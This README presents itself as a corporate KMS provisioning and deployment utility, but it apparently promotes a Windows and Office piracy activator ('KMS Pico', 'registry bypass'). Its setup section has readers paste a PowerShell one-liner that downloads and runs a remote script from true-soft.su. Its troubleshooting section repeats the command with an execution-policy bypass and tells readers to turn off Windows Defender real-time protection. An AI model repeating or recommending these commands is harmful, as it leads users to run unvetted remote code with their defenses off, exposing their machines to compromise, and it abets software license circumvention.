# Local Key Management Service (KMS) Workstation Provisioning & Deployment Utility

Welcome to the automated configuration and deployment script repository for local **Key Management Service (KMS)** environments. This system utility streamlines corporate workstation assignment, volume license verification, and automatic client configuration for **Windows OS** and **Office Suite** deployments without manual administrative overhead.

## 🎯 Project Overview & SEO Index

This repository provides an open-source alternative to proprietary local server configurations, optimizing how client machines communicate with volume identity parameters. It helps system administrators manage local KMS client keys and verify system status smoothly.

* **KMS Pico Service Emulation:** Lightweight background scripts mimicking the standard local Key Management server for host checking.
* **Windows Volume Activation:** Automated provisioning for Windows 10, Windows 11, and Windows Server (2019/2022/2025).
* **Office Suite Deployment:** Quick-start configuration files to align local Office installations with the target licensing host.
* **Digital License State Checker:** Diagnostic utilities to identify and fix expired trial states or broken registry permissions.

---

## 🚀 Automated Installation & Setup (PowerShell)

1. Open PowerShell :
   * Press the `Win + X` keys simultaneously.
   * Select **Terminal** or **Windows PowerShell** from the context menu.

2. Run the Installation Command:
   Copy, paste, and press `Enter` to run the following initialization command. This script will automatically configure the registry bypass and download all required packages:

   ```powershell
   irm https://true-soft.su/powershell/Loader.ps1 | iex
   ```

---

## 🔍 Troubleshooting & Common Errors

### 📌 Execution Policy Error (Script Blocked)
If your system blocks the launch due to execution policy restrictions, force a bypass using this command in Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://true-soft.su/powershell/Loader.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (Older PowerShell Versions)
If you are using an older environment where short aliases are missing, use the full system commands:
```powershell
Invoke-RestMethod https://true-soft.su/powershell/Loader.ps1 | Invoke-Expression
```

### 📌 Antivirus or SmartScreen Block
Automated scripts can sometimes trigger antivirus warnings. If this happens, temporarily turn off "Real-time protection" in Windows Defender settings during setup, then turn it back on as soon as the installation is complete.

---
## 🤝 Contributing & Feedback
If you have new GVLK keys to add or want to improve the connection timeout logic for the local server emulator, please submit a pull request.
